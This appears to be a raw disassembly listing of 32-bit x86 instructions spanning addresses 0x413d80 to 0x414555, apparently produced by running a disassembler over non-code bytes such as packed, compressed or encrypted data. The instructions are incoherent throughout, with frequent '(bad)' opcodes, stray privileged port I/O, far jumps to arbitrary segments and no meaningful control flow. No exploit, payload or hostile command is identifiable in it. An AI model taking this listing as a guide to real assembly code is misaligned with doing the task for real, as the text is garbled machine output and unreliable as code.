  413d80:	jno    0x413d33
  413d82:	stc    
  413d83:	leave  
  413d84:	fnstsw WORD PTR [ebx-0x52]
  413d87:	push   edi
  413d89:	pop    esp
  413d8a:	and    DWORD PTR ds:0x337a32d,ebx
  413d90:	mov    bh,BYTE PTR [edi+0x529b5a07]
  413d96:	push   0x23
  413d98:	shl    BYTE PTR [ecx+0x4c3457d8],1
  413d9e:	cmp    edi,DWORD PTR [ebx-0x5a5f7951]
  413da4:	sbb    BYTE PTR ds:0x45adf374,dh
  413daa:	aas    
  413dab:	jg     0x413d75
  413dad:	sub    DWORD PTR [eax-0x71],ebp
  413db0:	int3   
  413db1:	retf   0x9845
  413db4:	cmp    BYTE PTR [edx],bl
  413db6:	pop    ss
  413db7:	mov    eax,ds:0xc54f000b
  413dbc:	jb     0x413d77
  413dbe:	xor    edi,DWORD PTR [esi-0x77]
  413dc1:	sbb    DWORD PTR [ebp+eax*2+0x40],eax
  413dc5:	enter  0xa091,0x7
  413dc9:	loopne 0x413d8c
  413dcb:	add    al,BYTE PTR [ebx+0x47fd302]
  413dd1:	push   ebx
  413dd2:	arpl   bp,cx
  413dd4:	mov    ds:0x618fb273,eax
  413dd9:	xchg   esp,eax
  413dda:	dec    esi
  413ddb:	fild   QWORD PTR [edi]
  413ddd:	(bad)  
  413dde:	jle    0x413e01
  413de0:	pop    edx
  413de1:	stc    
  413de2:	xor    eax,0xd1226b48
  413de7:	fstp   QWORD PTR ds:0x3c5996d4
  413ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dee:	mov    edx,0xe5883eb2
  413df3:	jae    0x413dc7
  413df5:	ret    0xa1a3
  413df8:	in     al,dx
  413df9:	xor    eax,0x535068cc
  413dfe:	jbe    0x413db6
  413e00:	push   ebx
  413e01:	xor    BYTE PTR [eax-0x636d9d77],cl
  413e07:	xchg   ebp,eax
  413e08:	mov    DWORD PTR [ebx],0x3434bf45
  413e0e:	push   eax
  413e0f:	xchg   esp,eax
  413e10:	add    eax,0xcd4b80ed
  413e15:	enter  0x165,0x8b
  413e19:	mov    edx,0xf95341d
  413e1e:	sbb    DWORD PTR [esi+0x48],esi
  413e21:	scas   al,BYTE PTR es:[edi]
  413e22:	in     eax,dx
  413e23:	ret    
  413e24:	inc    ebx
  413e25:	and    eax,eax
  413e27:	lods   al,BYTE PTR ds:[esi]
  413e28:	jmp    0xee36a5f0
  413e2d:	jne    0x413dc5
  413e2f:	inc    ecx
  413e30:	arpl   WORD PTR [edx+edx*4-0x6d],di
  413e34:	or     al,0x13
  413e36:	or     al,0xec
  413e38:	lds    edi,FWORD PTR [edx]
  413e3a:	cld    
  413e3b:	(bad)  
  413e3c:	push   ebp
  413e3d:	inc    ebp
  413e3e:	jae    0x413e70
  413e40:	mov    al,0xdc
  413e42:	sahf   
  413e43:	push   ebp
  413e44:	jbe    0x413de3
  413e46:	shl    ah,cl
  413e48:	imul   ebp,DWORD PTR [ecx-0x55],0x2d80e010
  413e4f:	mov    WORD PTR [eax+0x1f9592fc],gs
  413e55:	pop    edi
  413e56:	add    DWORD PTR [ecx-0xf],esi
  413e59:	sahf   
  413e5a:	gs iret 
  413e5c:	and    DWORD PTR [ecx+0x1a],eax
  413e5f:	mov    ebp,0x22f2dfb3
  413e64:	jbe    0x413e37
  413e66:	pop    edi
  413e67:	les    edi,FWORD PTR [ecx-0x14]
  413e6a:	xor    ecx,DWORD PTR [edx]
  413e6c:	dec    ebx
  413e6d:	jge    0x413e43
  413e6f:	sbb    DWORD PTR [eax-0x7a3e5b2c],ebp
  413e75:	int3   
  413e76:	cmp    eax,0x6d8144bb
  413e7b:	mov    eax,ds:0xec72f354
  413e80:	mov    bl,0x5a
  413e82:	(bad)  
  413e83:	stos   DWORD PTR es:[edi],eax
  413e84:	mov    esp,0xa80babff
  413e89:	mov    edi,0xa23dfe35
  413e8e:	mov    edi,0xbf3150d1
  413e93:	(bad)  
  413e95:	outs   dx,DWORD PTR ds:[esi]
  413e96:	cmc    
  413e97:	sub    BYTE PTR [esi],cl
  413e99:	cmp    edx,ebx
  413e9b:	mov    edi,0x3137a437
  413ea0:	cmp    eax,0x4079a418
  413ea5:	out    dx,eax
  413ea6:	fsubr  QWORD PTR [edi+eiz*1-0x6d6f8314]
  413ead:	mov    ch,BYTE PTR [ebx-0x4f4c3ea1]
  413eb3:	hlt    
  413eb4:	inc    edi
  413eb5:	cmp    DWORD PTR [edi+0x52],0xffffffe9
  413eb9:	xchg   ecx,eax
  413eba:	mov    eax,DWORD PTR [edi]
  413ebc:	mov    cl,dh
  413ebe:	lds    ebp,FWORD PTR [eax+ebp*2]
  413ec1:	addr16 mov esi,0x395a2ea8
  413ec7:	push   ebx
  413ec8:	mov    ds:0x110b7c7f,al
  413ecd:	dec    edi
  413ece:	stc    
  413ecf:	cli    
  413ed0:	enter  0xccc7,0x4a
  413ed4:	(bad)  [ebp-0x4a73afc2]
  413eda:	mov    dh,0xf1
  413edc:	fldcw  WORD PTR [eax-0x571fe6f6]
  413ee2:	and    ebp,DWORD PTR [esi+0x2d]
  413ee5:	std    
  413ee6:	pop    ds
  413ee7:	lea    ebx,[edx]
  413ee9:	idiv   DWORD PTR [ecx-0x43]
  413eec:	test   eax,0xac566488
  413ef1:	or     BYTE PTR [esp+ecx*8-0x14],0x7e
  413ef6:	mov    dl,dl
  413ef8:	lods   al,BYTE PTR ds:[esi]
  413ef9:	shr    DWORD PTR [eax+0x21],0x1d
  413efd:	fstp   DWORD PTR [eax]
  413eff:	add    cl,dl
  413f01:	jl     0x413f0b
  413f03:	xor    al,BYTE PTR [ebp+0x1d]
  413f06:	outs   dx,BYTE PTR ds:[esi]
  413f07:	arpl   sp,bx
  413f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f0b:	jmp    0xb8ae:0x410268a1
  413f12:	jecxz  0x413f92
  413f14:	adc    al,0x5b
  413f16:	push   edi
  413f17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f18:	arpl   si,si
  413f1a:	push   ebp
  413f1b:	(bad)  
  413f1c:	adc    al,0xe9
  413f1e:	addr16 push es
  413f20:	add    BYTE PTR ds:0xb8b89738,dh
  413f26:	mov    ds:0xddaef61b,al
  413f2b:	cmp    eax,0x6784de96
  413f30:	frstor [ecx+0x404b61d0]
  413f36:	sub    bh,BYTE PTR [edx+0x603dbf0b]
  413f3c:	nop
  413f3d:	sbb    DWORD PTR [ecx],0xffffffdc
  413f40:	imul   eax
  413f42:	cmp    eax,0xb16f0e90
  413f47:	in     eax,0xc
  413f49:	clc    
  413f4a:	repnz xchg esi,eax
  413f4c:	adc    al,0xc3
  413f4e:	daa    
  413f4f:	mov    bh,0x6b
  413f51:	fsub   DWORD PTR [ecx+0x74]
  413f54:	jbe    0x413f69
  413f56:	call   DWORD PTR [ebx]
  413f58:	daa    
  413f59:	jmp    0x12d68d13
  413f5e:	xchg   esp,eax
  413f5f:	mov    dl,0xa
  413f61:	js     0x413fc2
  413f63:	inc    edx
  413f64:	nop
  413f65:	call   0x1913:0x1949bf80
  413f6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f6d:	jae    0x413f95
  413f6f:	lds    ebp,FWORD PTR [edx]
  413f71:	jo     0x413f2f
  413f73:	inc    esi
  413f74:	or     DWORD PTR [edi-0x7397f244],ebx
  413f7a:	nop
  413f7b:	arpl   WORD PTR ds:0xed417fb9,cx
  413f82:	fwait
  413f83:	cld    
  413f84:	aam    0xa3
  413f86:	inc    esi
  413f87:	arpl   WORD PTR [ebx],di
  413f89:	mov    bh,0x2b
  413f8b:	mov    fs,WORD PTR [ecx]
  413f8d:	shl    DWORD PTR [esi+0x43e04934],cl
  413f93:	lahf   
  413f94:	popa   
  413f95:	and    ah,cl
  413f97:	scas   eax,DWORD PTR es:[edi]
  413f98:	cmp    ecx,esi
  413f9a:	ja     0x413f84
  413f9c:	mov    ebx,0x3102c6cf
  413fa1:	dec    ebx
  413fa2:	(bad)  
  413fa3:	call   0xb456a0cf
  413fa8:	mov    bl,0x5a
  413faa:	fcomp  DWORD PTR [ebx-0x2d]
  413fad:	retf   0xd2ce
  413fb0:	push   0x5229eecb
  413fb5:	jmp    0x668a31e0
  413fba:	loope  0x413fa2
  413fbc:	sub    al,0x1d
  413fbe:	jns    0x413fe0
  413fc0:	jnp    0x413f69
  413fc2:	and    al,0xba
  413fc4:	xor    eax,0xd64ad0f8
  413fc9:	clc    
  413fca:	int    0xf0
  413fcc:	sub    esi,ebx
  413fce:	sbb    al,0xa
  413fd0:	(bad)  
  413fd1:	mov    eax,0x17f1f481
  413fd6:	leave  
  413fd7:	dec    edi
  413fd8:	push   edx
  413fd9:	js     0x413faf
  413fdb:	outs   dx,DWORD PTR ds:[esi]
  413fdc:	not    BYTE PTR [edx+0x505d24b7]
  413fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fe3:	aaa    
  413fe4:	(bad)  
  413fe5:	xor    BYTE PTR [edi-0x1d],bl
  413fe8:	ins    BYTE PTR es:[edi],dx
  413fe9:	inc    eax
  413fea:	lds    edx,FWORD PTR [bx+si]
  413fed:	std    
  413fee:	in     eax,0x80
  413ff0:	add    dl,BYTE PTR ss:[esp+ebx*2-0x6eeada12]
  413ff8:	xor    dh,bh
  413ffa:	sar    DWORD PTR [eax-0x9],cl
  413ffd:	test   eax,0x917f87c3
  414002:	cmp    DWORD PTR [ebp+0x60980166],ecx
  414008:	xor    bh,al
  41400a:	(bad)  
  41400b:	mov    cl,0xf5
  41400d:	repz lahf 
  41400f:	fwait
  414010:	sub    eax,0x3ff5e173
  414015:	mov    esi,0xf51600e1
  41401a:	fmul   DWORD PTR [edx+0x5d]
  41401d:	loop   0x414076
  41401f:	or     BYTE PTR [edi+0x4cf82119],0x0
  414026:	xor    DWORD PTR [edx-0x90f9a92],esp
  41402c:	rol    ecx,cl
  41402e:	aaa    
  41402f:	int3   
  414030:	test   BYTE PTR [ebx+0x65d7c735],al
  414036:	and    eax,0xf3498878
  41403b:	jae    0x413ff3
  41403d:	push   ecx
  41403e:	and    esp,edx
  414040:	and    al,0x2f
  414042:	sbb    eax,0x28dfecb5
  414047:	push   eax
  414048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414049:	jnp    0x414081
  41404b:	fninit 
  41404d:	and    al,0x5
  41404f:	dec    ebp
  414050:	jg     0x4140a0
  414052:	sbb    cl,BYTE PTR [esi]
  414054:	jmp    0xa399:0x10268edd
  41405b:	in     al,dx
  41405c:	dec    esi
  41405d:	cmp    BYTE PTR [ecx+edx*8-0x4],dh
  414061:	out    dx,al
  414062:	pop    ss
  414063:	mov    ecx,0x45081a58
  414068:	add    dh,BYTE PTR [ebx+0x68d49ee6]
  41406e:	lahf   
  41406f:	xor    al,0xbc
  414071:	mov    ch,0x1e
  414073:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414074:	jge    0x41407c
  414076:	inc    edi
  414077:	pop    es
  414078:	packsswb mm3,QWORD PTR [ebp-0x29f45423]
  41407f:	sub    eax,0x4dc9f37d
  414084:	xor    al,0x29
  414086:	mov    DWORD PTR [edx+ecx*4+0x6e7d56c4],ebp
  41408d:	xchg   edx,eax
  41408e:	inc    edx
  41408f:	int3   
  414090:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414091:	push   eax
  414092:	jecxz  0x4140e4
  414094:	outs   dx,BYTE PTR ds:[si]
  414096:	rcr    DWORD PTR [esi+ebx*4+0x78],0x14
  41409b:	adc    esi,edx
  41409d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41409e:	cmp    DWORD PTR [ecx-0x54],edx
  4140a1:	push   edi
  4140a2:	fldcw  WORD PTR [esi]
  4140a4:	jno    0x414041
  4140a6:	loopne 0x4140c9
  4140a8:	push   edi
  4140a9:	mov    al,0x6c
  4140ab:	sub    BYTE PTR [edi+0x89ad322],al
  4140b1:	mov    ds:0x85a54cdd,al
  4140b6:	add    bh,BYTE PTR [edx+0x54]
  4140b9:	inc    edi
  4140ba:	fcmovnb st,st(1)
  4140bc:	int    0x87
  4140be:	adc    eax,0x38bfd8d6
  4140c3:	adc    al,BYTE PTR [eax-0x60]
  4140c6:	cmp    dh,BYTE PTR [edx]
  4140c8:	cmp    BYTE PTR [eax+0x0],al
  4140cb:	and    BYTE PTR [eax+0x54],ch
  4140ce:	sub    eax,0xd4d21c5b
  4140d3:	cmp    eax,0x3650c0ae
  4140d8:	jl     0x414099
  4140da:	add    ch,BYTE PTR [ebx-0x68]
  4140dd:	icebp  
  4140de:	shl    DWORD PTR [eax+esi*2-0x6a875087],0x7b
  4140e6:	adc    eax,DWORD PTR [edi-0x5c]
  4140e9:	pop    ebp
  4140ea:	fwait
  4140eb:	dec    ebp
  4140ec:	stos   BYTE PTR es:[edi],al
  4140ed:	test   DWORD PTR [ecx+0x605cca9e],eax
  4140f3:	xchg   ebx,eax
  4140f4:	nop
  4140f5:	test   eax,0x7dfb6d68
  4140fa:	jne    0x4140d0
  4140fc:	out    0x4d,eax
  4140fe:	xor    DWORD PTR [edx],0xffffffa8
  414101:	xor    DWORD PTR [edx-0x2ebd0f24],eax
  414107:	sub    al,0xd7
  414109:	cmp    al,0xf8
  41410b:	xchg   ebx,eax
  41410c:	and    DWORD PTR [edx-0x2a],edi
  41410f:	dec    edx
  414110:	aad    0x1e
  414112:	pop    edx
  414113:	cmp    eax,0x98947db9
  414118:	cli    
  414119:	icebp  
  41411a:	cmp    eax,DWORD PTR [ebx+0x1d]
  41411d:	(bad)  
  41411e:	cli    
  41411f:	out    0x12,al
  414121:	in     al,dx
  414122:	push   ebx
  414123:	sub    eax,0xac1ee543
  414128:	adc    DWORD PTR [esi-0x45a688e5],0xcd6dadae
  414132:	adc    eax,0x30c32e5b
  414137:	dec    esi
  414138:	aas    
  414139:	iret   
  41413a:	dec    edx
  41413b:	jp     0x414172
  41413d:	iret   
  41413e:	in     al,0xe5
  414140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414141:	mov    ah,0x59
  414143:	enter  0x47fd,0x6c
  414147:	mov    cl,0xd
  414149:	mov    edx,0x434db494
  41414e:	pop    es
  41414f:	out    dx,eax
  414150:	sub    BYTE PTR [esi],bh
  414152:	add    eax,DWORD PTR [edx+0x17b12bd7]
  414158:	jge    0x4140fd
  41415a:	icebp  
  41415b:	jno    0x4141ae
  41415d:	xor    BYTE PTR [ebx],bl
  41415f:	mov    ebx,0x4a404ef2
  414164:	xrelease mov BYTE PTR [ecx],bh
  414167:	ret    
  414168:	jg     0x414119
  41416a:	mov    esi,DWORD PTR [ebx+0x74a4fb81]
  414170:	lods   al,BYTE PTR ds:[esi]
  414171:	pop    es
  414172:	test   edx,ecx
  414174:	fwait
  414175:	xchg   ecx,eax
  414176:	enter  0xd73d,0xa7
  41417a:	mov    al,0xb2
  41417c:	icebp  
  41417d:	enter  0x1edc,0x99
  414181:	jns    0x414121
  414183:	loop   0x414180
  414185:	mov    eax,ds:0x7cc3ae98
  41418a:	pop    ebp
  41418b:	mov    ebp,0x6793843
  414190:	or     cl,dh
  414192:	and    eax,0xcfbabaf2
  414197:	mov    edx,0x54007f15
  41419c:	jb     0x414141
  41419e:	shl    BYTE PTR [ecx],1
  4141a0:	test   BYTE PTR [esi+edi*2],ch
  4141a3:	pop    ebx
  4141a4:	sub    al,0x32
  4141a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141a7:	dec    ebx
  4141a8:	sbb    edx,DWORD PTR [ebx]
  4141aa:	mov    esi,0x7af67437
  4141af:	or     bl,dh
  4141b1:	ins    BYTE PTR es:[edi],dx
  4141b2:	lea    edi,[ebx-0xcb02188]
  4141b8:	or     ax,0x3da4
  4141bc:	xchg   edx,eax
  4141bd:	clc    
  4141be:	xchg   ebx,eax
  4141bf:	call   0x9cb9:0xac1b847b
  4141c6:	inc    eax
  4141c7:	test   al,0xb6
  4141c9:	sbb    bh,bl
  4141cb:	sbb    eax,ebp
  4141cd:	mov    ah,0x1d
  4141cf:	pop    ds
  4141d0:	cli    
  4141d1:	sub    cl,BYTE PTR [edx-0x51f94bd8]
  4141d7:	jne    0x4141b2
  4141d9:	dec    esp
  4141da:	push   eax
  4141db:	push   ds
  4141dc:	xchg   ebp,eax
  4141dd:	xchg   ebx,eax
  4141de:	sub    edx,0x5d862abd
  4141e4:	or     eax,0x3dc76092
  4141e9:	and    DWORD PTR [edi+0x17151be6],ebx
  4141ef:	les    edx,FWORD PTR [ebx+0x3]
  4141f2:	jno    0x41418e
  4141f4:	adc    BYTE PTR [esi],dh
  4141f6:	in     eax,0xa5
  4141f8:	(bad)  
  4141f9:	cli    
  4141fa:	leave  
  4141fb:	jnp    0x4141cd
  4141fd:	outs   dx,BYTE PTR ds:[esi]
  4141fe:	lock mov al,ds:0x9a3727f4
  414204:	paddsw mm2,QWORD PTR [edi]
  414207:	fstp   QWORD PTR [edx-0x104b4842]
  41420d:	and    ebp,DWORD PTR [ecx+0x6af15282]
  414213:	dec    edi
  414214:	ins    BYTE PTR es:[edi],dx
  414215:	sbb    eax,0xab68fcfd
  41421a:	outs   dx,BYTE PTR ds:[esi]
  41421b:	sti    
  41421c:	clc    
  41421d:	outs   dx,BYTE PTR ds:[esi]
  41421e:	xchg   edx,eax
  41421f:	loop   0x414266
  414221:	into   
  414222:	pop    edx
  414223:	cmp    dl,bl
  414225:	cli    
  414226:	(bad)  
  414227:	push   ebp
  414228:	pop    ebp
  414229:	in     eax,dx
  41422a:	sahf   
  41422b:	in     eax,dx
  41422c:	jge    0x41420b
  41422e:	retf   
  41422f:	adc    al,0xa
  414231:	out    0xdd,eax
  414233:	dec    esi
  414234:	mov    eax,DWORD PTR [edx]
  414236:	adc    ah,bl
  414238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414239:	adc    BYTE PTR [esi],al
  41423b:	or     eax,edx
  41423d:	sbb    BYTE PTR [edx+edx*4],cl
  414240:	mov    edx,0x9b477202
  414245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414246:	mov    ebx,0x8ec00b5e
  41424b:	xor    DWORD PTR [bp+si],edi
  41424e:	push   ecx
  41424f:	jae    0x41422a
  414251:	enter  0x908f,0x3e
  414255:	mov    edx,0x2dbac152
  41425a:	mov    ds:0x5d122a95,al
  41425f:	rol    BYTE PTR [ecx+0x1f],cl
  414262:	push   edi
  414263:	jmp    0x4142e4
  414265:	fdiv   QWORD PTR [edi]
  414267:	test   al,0xb1
  414269:	and    ecx,DWORD PTR [ebp+0x3b8596d1]
  41426f:	icebp  
  414270:	inc    ecx
  414271:	and    ch,0xfd
  414274:	push   cs
  414275:	nop
  414276:	cwde   
  414277:	nop
  414278:	sub    bl,BYTE PTR [edi+esi*8-0x6d]
  41427c:	and    ecx,DWORD PTR [eax+esi*4+0x7babb90a]
  414283:	addr16 mov esi,0xb98e6a65
  414289:	stos   DWORD PTR es:[edi],eax
  41428a:	jns    0x414271
  41428c:	push   ecx
  41428d:	mov    al,0x36
  41428f:	sub    eax,0x1a02675d
  414294:	add    BYTE PTR [eax],dh
  414296:	into   
  414297:	adc    eax,0x45104ca1
  41429c:	aas    
  41429d:	push   ss
  41429e:	int    0x4f
  4142a0:	pop    ss
  4142a1:	inc    esi
  4142a2:	push   0x204d0b7d
  4142a7:	xor    dh,BYTE PTR [edi]
  4142a9:	sar    dh,0x99
  4142ac:	aam    0xce
  4142ae:	enter  0x426d,0xa2
  4142b2:	dec    edi
  4142b3:	out    dx,al
  4142b4:	out    dx,al
  4142b5:	push   edx
  4142b6:	mov    DWORD PTR ds:0x2c1a6b0a,eax
  4142bc:	es inc edx
  4142be:	jecxz  0x4142b2
  4142c0:	jl     0x414268
  4142c2:	xor    ecx,eax
  4142c4:	cld    
  4142c5:	jl     0x4142c1
  4142c7:	xchg   esi,eax
  4142c8:	xchg   esi,eax
  4142c9:	pop    ss
  4142ca:	fisub  WORD PTR [ecx-0x14bbd5ee]
  4142d0:	sub    ch,dh
  4142d2:	xor    BYTE PTR [ecx-0x2cca479a],al
  4142d8:	and    esp,DWORD PTR [ebx]
  4142da:	xor    bl,BYTE PTR [edx+ecx*1]
  4142dd:	popf   
  4142de:	rcr    DWORD PTR [esi-0x7189f7e6],cl
  4142e4:	lahf   
  4142e5:	inc    edx
  4142e6:	xchg   BYTE PTR [edx+0x1d],ch
  4142e9:	(bad)  
  4142ea:	push   ds
  4142eb:	fbstp  TBYTE PTR [edx]
  4142ed:	icebp  
  4142ee:	pushf  
  4142ef:	add    eax,0xe9607630
  4142f4:	popa   
  4142f5:	inc    esp
  4142f6:	fs push esp
  4142f8:	pop    ecx
  4142f9:	dec    edi
  4142fa:	stos   DWORD PTR es:[edi],eax
  4142fb:	push   esi
  4142fc:	popa   
  4142fd:	mov    al,0x44
  4142ff:	add    BYTE PTR [eax],bl
  414301:	add    al,BYTE PTR [edx+ecx*4]
  414304:	cmp    eax,0xc7ba67f5
  414309:	fsubr  st(2),st
  41430b:	jo     0x4142f6
  41430d:	and    eax,0x5a33dd2d
  414312:	lods   al,BYTE PTR ds:[esi]
  414313:	popf   
  414314:	stos   DWORD PTR es:[edi],eax
  414315:	fcmovb st,st(5)
  414317:	add    ecx,esp
  414319:	fst    QWORD PTR [ecx]
  41431b:	fmul   st(1),st
  41431d:	xchg   esi,eax
  41431e:	popf   
  41431f:	shl    BYTE PTR [edx+0x16],cl
  414322:	cdq    
  414323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414324:	aaa    
  414325:	dec    esi
  414326:	(bad)  
  414327:	fadd   QWORD PTR [esi+edi*2+0x386fdc0a]
  41432e:	in     al,0xf5
  414330:	dec    eax
  414331:	les    eax,FWORD PTR [esi]
  414333:	inc    esp
  414334:	jle    0x4142df
  414336:	xchg   esp,eax
  414337:	jl     0x414329
  414339:	add    eax,0x77b1e501
  41433e:	jo     0x414387
  414340:	mov    ch,0xa6
  414342:	lock (bad) 
  414344:	lds    ebx,FWORD PTR [ebx]
  414346:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414347:	cmp    al,0xfa
  414349:	aam    0x22
  41434b:	aad    0x6e
  41434d:	je     0x41431f
  41434f:	stc    
  414350:	loopne 0x4143c7
  414352:	mov    ebp,0x2e2775ec
  414357:	pop    eax
  414358:	mov    cl,0x85
  41435a:	popf   
  41435b:	popa   
  41435c:	mov    al,ds:0xd27512f3
  414361:	mov    esi,0xeef2048b
  414366:	into   
  414367:	cmc    
  414368:	pop    esp
  414369:	mov    ah,0x67
  41436b:	cmc    
  41436c:	pop    edi
  41436d:	xchg   ecx,eax
  41436e:	into   
  41436f:	sahf   
  414370:	fnstsw WORD PTR [esi-0x749a019e]
  414376:	pop    esp
  414377:	or     bh,dl
  414379:	stos   DWORD PTR es:[edi],eax
  41437a:	in     eax,dx
  41437b:	mov    bh,0xb2
  41437d:	lahf   
  41437e:	dec    edx
  41437f:	and    edi,DWORD PTR [ecx+0x47ed762b]
  414385:	push   0x4e
  414387:	fist   DWORD PTR [ecx+0x47]
  41438a:	outs   dx,DWORD PTR ds:[esi]
  41438b:	mov    WORD PTR [eax+0x6284e1b1],?
  414391:	aam    0xcc
  414393:	mov    ebx,ebx
  414395:	outs   dx,DWORD PTR ds:[esi]
  414396:	jle    0x4143cd
  414398:	or     al,0x58
  41439a:	icebp  
  41439b:	(bad)  
  41439c:	fidiv  DWORD PTR [edx-0x78]
  41439f:	sub    eax,0xd6ddf6e6
  4143a4:	jbe    0x41441f
  4143a6:	jo     0x414411
  4143a8:	aad    0xd8
  4143aa:	inc    ecx
  4143ab:	ins    DWORD PTR es:[edi],dx
  4143ac:	or     edi,DWORD PTR [eax+0x19c9cd8a]
  4143b2:	rep lods al,BYTE PTR ds:[esi]
  4143b4:	pop    esp
  4143b5:	jp     0x414424
  4143b7:	cmp    al,0x9b
  4143b9:	mov    bl,0x28
  4143bb:	fsubr  QWORD PTR [esi-0x59]
  4143be:	and    BYTE PTR [eax+ebx*4+0x2f4a550a],bh
  4143c5:	jb     0x4143cd
  4143c7:	test   al,0xf9
  4143c9:	sub    edx,DWORD PTR [ecx+0x749d49bc]
  4143cf:	sbb    eax,0xafb293c4
  4143d4:	cdq    
  4143d5:	lods   al,BYTE PTR ds:[esi]
  4143d6:	add    bl,bl
  4143d8:	pop    ebp
  4143d9:	int3   
  4143da:	test   al,0x82
  4143dc:	hlt    
  4143dd:	hlt    
  4143de:	xor    dl,BYTE PTR [ebx+0x559bd26f]
  4143e4:	sub    eax,0x242f1ae6
  4143e9:	ss shl ah,cl
  4143ec:	push   ss
  4143ed:	push   ebx
  4143ee:	and    DWORD PTR [ecx+0x32e87a03],ecx
  4143f4:	test   cl,cl
  4143f6:	out    dx,eax
  4143f7:	int3   
  4143f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f9:	dec    ebp
  4143fa:	cmp    BYTE PTR [edi-0x7b3aea71],ah
  414400:	fcomi  st,st(1)
  414402:	fmul   DWORD PTR [edi+0x6fbb708e]
  414408:	clc    
  414409:	pop    edx
  41440a:	cld    
  41440b:	adc    ebx,DWORD PTR [ecx+0x7]
  41440e:	pusha  
  41440f:	or     al,0x78
  414411:	lock ret 0xf5f2
  414415:	sbb    DWORD PTR [esi+ecx*2+0x8bd8e18],esp
  41441c:	inc    edx
  41441d:	xor    DWORD PTR [ebx-0x80],ecx
  414420:	xlat   BYTE PTR ds:[ebx]
  414421:	mov    esi,0x22e35065
  414426:	ss enter 0x97cc,0xc7
  41442b:	ss ffreep st(1)
  41442e:	mov    esp,0xc42cebc4
  414433:	add    cl,dh
  414435:	mov    ah,BYTE PTR ds:0xdad4f0
  41443b:	or     BYTE PTR [esi-0x79c96d0b],bh
  414441:	or     esp,DWORD PTR [ebx-0x2d54be0b]
  414447:	loop   0x41447b
  414449:	add    DWORD PTR [esi+0x8],eax
  41444c:	in     eax,0x3d
  41444e:	call   0x2dd02122
  414453:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414454:	or     BYTE PTR [esi-0xd],bl
  414457:	(bad)  
  414458:	aas    
  414459:	call   0x4012:0x2b095bf9
  414460:	mov    bh,0x45
  414462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414463:	enter  0x2b54,0x10
  414467:	int3   
  414468:	leave  
  414469:	pop    esp
  41446a:	inc    edx
  41446b:	jg     0x4143f2
  41446d:	push   esp
  41446e:	in     eax,dx
  41446f:	es mov esp,0x246ded19
  414475:	js     0x4144ce
  414477:	xchg   BYTE PTR [ebx-0x511fd3f4],dh
  41447d:	mov    ds:0xec785d34,eax
  414482:	in     al,0x81
  414484:	xchg   esp,eax
  414485:	call   0xc005:0x5dc4b0a6
  41448c:	and    ecx,edx
  41448e:	xchg   ecx,eax
  41448f:	xchg   ebp,eax
  414490:	xchg   esi,eax
  414491:	loope  0x4144d5
  414493:	and    DWORD PTR [ecx+0x3f],esi
  414496:	test   DWORD PTR [edx+0x6a46f07],ebx
  41449c:	pop    edx
  41449d:	inc    ebp
  41449e:	sti    
  41449f:	mov    ah,BYTE PTR [esi+0x144b1f07]
  4144a5:	push   es
  4144a6:	test   BYTE PTR [ebp+0x51],0x53
  4144aa:	sbb    al,0xb3
  4144ac:	(bad)  
  4144ad:	sti    
  4144ae:	pop    es
  4144af:	loope  0x414468
  4144b1:	test   al,0x89
  4144b3:	js     0x4144dc
  4144b5:	adc    DWORD PTR [esi-0x51],0xf
  4144b9:	inc    edx
  4144ba:	and    dl,BYTE PTR [edx+0x6e]
  4144bd:	xor    DWORD PTR [ecx+0x5fb9d5c0],0x3eee0f0d
  4144c7:	test   DWORD PTR [eax-0x75],edx
  4144ca:	(bad)
  4144cd:	xchg   edi,eax
  4144ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144cf:	jno    0x4144f9
  4144d1:	cmp    DWORD PTR [ebx-0x10a93550],ecx
  4144d7:	push   ebx
  4144d8:	cmove  ecx,DWORD PTR [edi-0x6cbf8363]
  4144df:	rcr    BYTE PTR es:[esi+ecx*1+0x699c2e77],0xfd
  4144e8:	jbe    0x4144c6
  4144ea:	rcr    BYTE PTR [ebx],cl
  4144ec:	test   eax,0x62f9dd55
  4144f1:	cs mov edi,0xe3007e98
  4144f7:	and    ebp,ebp
  4144f9:	fdivp  st(3),st
  4144fb:	in     eax,0x4f
  4144fd:	mov    cs,ebp
  4144ff:	loop   0x4144ca
  414501:	push   esi
  414502:	mov    cl,0xf
  414504:	stos   DWORD PTR es:[edi],eax
  414505:	jg     0x41453c
  414507:	or     eax,0x7dca895
  41450c:	push   ebx
  41450d:	mov    bl,0x85
  41450f:	inc    edi
  414510:	neg    BYTE PTR ds:0xf072c5f6
  414516:	(bad)  
  414517:	xor    DWORD PTR [edi],edi
  414519:	inc    eax
  41451a:	add    eax,0x9cc804bc
  41451f:	clc    
  414520:	xchg   ecx,eax
  414521:	imul   ebp,DWORD PTR [esi+eiz*1+0x2fae992f],0x41
  414529:	adc    ah,BYTE PTR [ebx+0xf810b08]
  41452f:	into   
  414530:	push   esp
  414531:	in     al,0x3
  414533:	xor    DWORD PTR [esi+0x59],ebp
  414536:	loop   0x414567
  414538:	jmp    0x17e4:0x4362374a
  41453f:	push   esp
  414540:	cs mov ch,0x5d
  414543:	jns    0x41454e
  414545:	ins    BYTE PTR es:[edi],dx
  414546:	stos   BYTE PTR es:[edi],al
  414547:	(bad)  
  414548:	or     eax,0x3bb90458
  41454d:	call   0xf96afb6f
  414552:	adc    DWORD PTR [eax+edi*4],esp
  414555:	mov    ecx,eax
